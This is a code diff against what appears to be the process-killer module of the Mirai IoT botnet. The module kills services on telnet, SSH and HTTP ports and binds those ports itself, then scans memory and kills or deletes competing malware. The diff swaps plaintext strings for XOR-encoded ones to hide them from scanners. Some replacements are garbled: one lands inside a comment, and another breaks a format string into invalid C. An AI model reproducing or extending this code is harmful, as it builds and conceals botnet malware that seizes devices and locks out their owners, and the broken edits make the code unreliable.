@@ -39,16 +39,16 @@ void killer_init(void)
     // Kill telnet service and prevent it from restarting
 #ifdef KILLER_REBIND_TELNET
 #ifdef DEBUG
-    printf("[killer] Trying to kill port 23\n");
+    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x5E\x78\x73\x63\x64\x6D\x2A\x7E\x65\x2A\x61\x63\x66\x66\x2A\x7A\x65\x78\x7E\x2A\x38\x39\x00\x0A", 33));
 #endif
     if (killer_kill_by_port(htons(23)))
     {
 #ifdef DEBUG
-        printf("[killer] Killed tcp/23 (telnet)\n");
+        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x41\x63\x66\x66\x6F\x6E\x2A\x7E\x69\x7A\x25\x38\x39\x2A\x22\x7E\x6F\x66\x64\x6F\x7E\x23\x00\x0A", 33));
 #endif
     } else {
 #ifdef DEBUG
-        printf("[killer] Failed to kill port 23\n");
+        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x61\x63\x66\x66\x2A\x7A\x65\x78\x7E\x2A\x38\x39\x00\x0A", 33));
 #endif
     }
     tmp_bind_addr.sin_port = htons(23);
@@ -59,7 +59,7 @@ void killer_init(void)
         listen(tmp_bind_fd, 1);
     }
 #ifdef DEBUG
-    printf("[killer] Bound to tcp/23 (telnet)\n");
+    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x48\x65\x7F\x64\x6E\x2A\x7E\x65\x2A\x7E\x69\x7A\x25\x38\x39\x2A\x22\x7E\x6F\x66\x64\x6F\x7E\x23\x00\x0A", 35));
 #endif
 #endif
 
@@ -68,7 +68,7 @@ void killer_init(void)
     if (killer_kill_by_port(htons(22)))
     {
 #ifdef DEBUG
-        printf("[killer] Killed tcp/22 (SSH)\n");
+        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x41\x63\x66\x66\x6F\x6E\x2A\x7E\x69\x7A\x25\x38\x38\x2A\x22\x59\x59\x42\x23\x00\x0A", 30));
 #endif
     }
     tmp_bind_addr.sin_port = htons(22);
@@ -79,7 +79,7 @@ void killer_init(void)
         listen(tmp_bind_fd, 1);
     }
 #ifdef DEBUG
-    printf("[killer] Bound to tcp/22 (SSH)\n");
+    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x48\x65\x7F\x64\x6E\x2A\x7E\x65\x2A\x7E\x69\x7A\x25\x38\x38\x2A\x22\x59\x59\x42\x23\x00\x0A", 32));
 #endif
 #endif
 
@@ -88,7 +88,7 @@ void killer_init(void)
     if (killer_kill_by_port(htons(80)))
     {
 #ifdef DEBUG
-        printf("[killer] Killed tcp/80 (http)\n");
+        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x41\x63\x66\x66\x6F\x6E\x2A\x7E\x69\x7A\x25\x32\x3A\x2A\x22\x62\x7E\x7E\x7A\x23\x00\x0A", 31));
 #endif
     }
     tmp_bind_addr.sin_port = htons(80);
@@ -99,7 +99,7 @@ void killer_init(void)
         listen(tmp_bind_fd, 1);
     }
 #ifdef DEBUG
-    printf("[killer] Bound to tcp/80 (http)\n");
+    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x48\x65\x7F\x64\x6E\x2A\x7E\x65\x2A\x7E\x69\x7A\x25\x32\x3A\x2A\x22\x62\x7E\x7E\x7A\x23\x00\x0A", 33));
 #endif
 #endif
 
@@ -113,12 +113,12 @@ void killer_init(void)
     if (!has_exe_access())
     {
 #ifdef DEBUG
-        printf("[killer] Machine does not have /proc/$pid/exe\n");
+        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x47\x6B\x69\x62\x63\x64\x6F\x2A\x6E\x65\x6F\x79\x2A\x64\x65\x7E\x2A\x62\x6B\x7C\x6F\x2A\x25\x7A\x78\x65\x69\x25\x2E\x7A\x63\x6E\x25\x6F\x72\x6F\x00\x0A", 47));
 #endif
         return;
     }
 #ifdef DEBUG
-    printf("[killer] Memory scanning processes\n");
+    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x47\x6F\x67\x65\x78\x73\x2A\x79\x69\x6B\x64\x64\x63\x64\x6D\x2A\x7A\x78\x65\x69\x6F\x79\x79\x6F\x79\x00\x0A", 36));
 #endif
 
     while (TRUE)
@@ -130,7 +130,7 @@ void killer_init(void)
         if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
         {
 #ifdef DEBUG
-            printf("[killer] Failed to open /proc!\n");
+            printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x65\x7A\x6F\x64\x2A\x25\x7A\x78\x65\x69\x2B\x00\x0A", 32));
 #endif
             break;
         }
@@ -152,7 +152,7 @@ void killer_init(void)
                 if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                 {
 #ifdef DEBUG
-                    printf("[killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
+                    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x2F\x6E\x2A\x79\x6F\x69\x65\x64\x6E\x79\x2A\x62\x6B\x7C\x6F\x2A\x7A\x6B\x79\x79\x6F\x6E\x2A\x79\x63\x64\x69\x6F\x2A\x66\x6B\x79\x7E\x2A\x79\x69\x6B\x64\x24\x2A\x58\x6F\x27\x79\x69\x6B\x64\x64\x63\x64\x6D\x2A\x6B\x66\x66\x2A\x7A\x78\x65\x69\x6F\x79\x79\x6F\x79\x2B\x00\x0A", 77), KILLER_RESTART_SCAN_TIME);
 #endif
                     killer_highest_pid = KILLER_MIN_PID;
                 }
@@ -190,7 +190,7 @@ void killer_init(void)
                 realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string
 
                 table_unlock_val(TABLE_KILLER_ANIME);
-                // If path contains ".anime" kill.
+                // If path contains (char*)util_decrypt("\x24\x6B\x64\x63\x67\x6F\x0A", 7) kill.
                 if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
                 {
                     unlink(realpath);
@@ -205,7 +205,7 @@ void killer_init(void)
                 if ((fd = open(realpath, O_RDONLY)) == -1)
                 {
 #ifdef DEBUG
-                    printf("[killer] Process '%s' has deleted binary!\n", realpath);
+                    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x5A\x78\x65\x69\x6F\x79\x79\x2A\x2D\x2F\x79\x2D\x2A\x62\x6B\x79\x2A\x6E\x6F\x66\x6F\x7E\x6F\x6E\x2A\x68\x63\x64\x6B\x78\x73\x2B\x00\x0A", 43), realpath);
 #endif
                     kill(pid, 9);
                 }
@@ -215,7 +215,7 @@ void killer_init(void)
             if (memory_scan_match(exe_path))
             {
 #ifdef DEBUG
-                printf("[killer] Memory scan match for binary %s\n", exe_path);
+                printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x47\x6F\x67\x65\x78\x73\x2A\x79\x69\x6B\x64\x2A\x67\x6B\x7E\x69\x62\x2A\x6C\x65\x78\x2A\x68\x63\x64\x6B\x78\x73\x2A\x2F\x79\x00\x0A", 42), exe_path);
 #endif
                 kill(pid, 9);
             } 
@@ -224,7 +224,7 @@ void killer_init(void)
             if (upx_scan_match(exe_path, status_path))
             {
 #ifdef DEBUG
-                printf("[killer] UPX scan match for binary %s\n", exe_path);
+                printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x5F\x5A\x52\x2A\x79\x69\x6B\x64\x2A\x67\x6B\x7E\x69\x62\x2A\x6C\x65\x78\x2A\x68\x63\x64\x6B\x78\x73\x2A\x2F\x79\x00\x0A", 39), exe_path);
 #endif
                 kill(pid, 9);
             }
@@ -241,7 +241,7 @@ void killer_init(void)
     }
 
 #ifdef DEBUG
-    printf("[killer] Finished\n");
+    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x63\x64\x63\x79\x62\x6F\x6E\x00\x0A", 19));
 #endif
 }
 
@@ -262,7 +262,7 @@ BOOL killer_kill_by_port(port_t port)
     char port_str[16];
 
 #ifdef DEBUG
-    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
+    printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x63\x64\x6E\x63\x64\x6D\x2A\x6B\x64\x6E\x2A\x61\x63\x66\x66\x63\x64\x6D\x2A\x7A\x78\x65\x69\x6F\x79\x79\x6F\x79\x2A\x62\x65\x66\x6E\x63\x64\x6D\x2A\x7A\x65\x78\x7E\x2A\x2F\x6E\x00\x0A", 56), ntohs(port));
 #endif
 
     util_itoa(ntohs(port), 16, port_str);
@@ -280,7 +280,7 @@ BOOL killer_kill_by_port(port_t port)
     table_unlock_val(TABLE_KILLER_EXE);
     table_unlock_val(TABLE_KILLER_FD);
 
-    fd = open("/proc/net/tcp", O_RDONLY);
+    fd = open((char*)util_decrypt("\x25\x7A\x78\x65\x69\x25\x64\x6F\x7E\x25\x7E\x69\x7A\x0A", 14), O_RDONLY);
     if (fd == -1)
         return 0;
 
@@ -345,7 +345,7 @@ BOOL killer_kill_by_port(port_t port)
     if (util_strlen(inode) == 0)
     {
 #ifdef DEBUG
-        printf("Failed to find inode for port %d\n", ntohs(port));
+        printf((char*)util_decrypt("\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x6C\x63\x64\x6E\x2A\x63\x64\x65\x6E\x6F\x2A\x6C\x65\x78\x2A\x7A\x65\x78\x7E\x2A\x2F\x6E\x00\x0A", 34), ntohs(port));
 #endif
         table_lock_val(TABLE_KILLER_PROC);
         table_lock_val(TABLE_KILLER_EXE);
@@ -355,7 +355,7 @@ BOOL killer_kill_by_port(port_t port)
     }
 
 #ifdef DEBUG
-    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
+    printf((char*)util_decrypt("\x4C\x65\x7F\x64\x6E\x2A\x63\x64\x65\x6E\x6F\x2A\x56\x0A", 14)%s\(char*)util_decrypt("\x2A\x6C\x65\x78\x2A\x7A\x65\x78\x7E\x2A\x2F\x6E\x00\x0A", 14), inode, ntohs(port));
 #endif
 
     if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
@@ -388,7 +388,7 @@ BOOL killer_kill_by_port(port_t port)
                     util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                     util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                     util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
-                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
+                    util_strcpy(ptr_path + util_strlen(ptr_path), (char*)util_decrypt("\x25\x0A", 2));
                     util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                     if (readlink(path, exe, PATH_MAX) == -1)
                         continue;
@@ -396,7 +396,7 @@ BOOL killer_kill_by_port(port_t port)
                     if (util_stristr(exe, util_strlen(exe), inode) != -1)
                     {
 #ifdef DEBUG
-                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
+                        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x65\x7F\x64\x6E\x2A\x7A\x63\x6E\x2A\x2F\x6E\x2A\x6C\x65\x78\x2A\x7A\x65\x78\x7E\x2A\x2F\x6E\x00\x0A", 35), util_atoi(pid, 10), ntohs(port));
 #else
                         kill(util_atoi(pid, 10), 9);
 #endif
@@ -435,7 +435,7 @@ static BOOL has_exe_access(void)
     if ((fd = open(path, O_RDONLY)) == -1)
     {
 #ifdef DEBUG
-        printf("[killer] Failed to open()\n");
+        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x65\x7A\x6F\x64\x22\x23\x00\x0A", 27));
 #endif
         return FALSE;
     }
@@ -448,7 +448,7 @@ static BOOL has_exe_access(void)
     {
         killer_realpath[k_rp_len] = 0;
 #ifdef DEBUG
-        printf("[killer] Detected we are running out of `%s`\n", killer_realpath);
+        printf((char*)util_decrypt("\x51\x61\x63\x66\x66\x6F\x78\x57\x2A\x4E\x6F\x7E\x6F\x69\x7E\x6F\x6E\x2A\x7D\x6F\x2A\x6B\x78\x6F\x2A\x78\x7F\x64\x64\x63\x64\x6D\x2A\x65\x7F\x7E\x2A\x65\x6C\x2A\x6A\x2F\x79\x6A\x00\x0A", 46), killer_realpath);
 #endif
     }
 
